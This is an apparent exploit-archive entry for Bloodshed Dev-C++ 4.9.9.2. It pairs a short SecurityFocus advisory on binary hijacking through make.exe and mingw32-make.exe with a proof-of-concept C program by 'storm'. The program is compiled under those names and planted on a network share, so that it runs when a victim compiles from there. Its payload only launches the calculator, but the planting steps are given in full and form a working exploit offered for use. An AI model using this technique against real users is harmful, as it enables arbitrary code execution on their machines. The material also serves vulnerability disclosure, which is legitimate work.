// source: https://www.securityfocus.com/bid/42737/info

Bloodshed Dev-C++ is prone to a vulnerability that lets attackers execute arbitrary code. This issue affects 'make.exe' and 'minw32-make.exe'.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to compile a file from a network share location that contains a specially crafted executable file.

Bloodshed Dev-C++ 4.9.9.2 is vulnerable; other versions may also be affected. 

/*
Exploit Title: Bloodshed Dev-C++ Binary Hijacking Exploit (make.exe, mingw32-make.exe)
Date: August 25, 2010
Author: storm (storm@gonullyourself.org)
Version: 4.9.9.2
Tested on: Windows Vista SP2

http://www.gonullyourself.org/

gcc -o make.exe Dev-C++-Binary.c
gcc -o mingw32-make.exe Dev-C++-Binary.c

...and place in appropriate directory.  Executes your code four times.

Every file extension associated with Dev-C++ (.c, .cpp, .dev, .h, .hpp, .rc, .template) is affected.  Dev-C++ Package Manager files (.devpackage, .devpak) are not affected, however.
*/

#include <windows.h>

int main()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}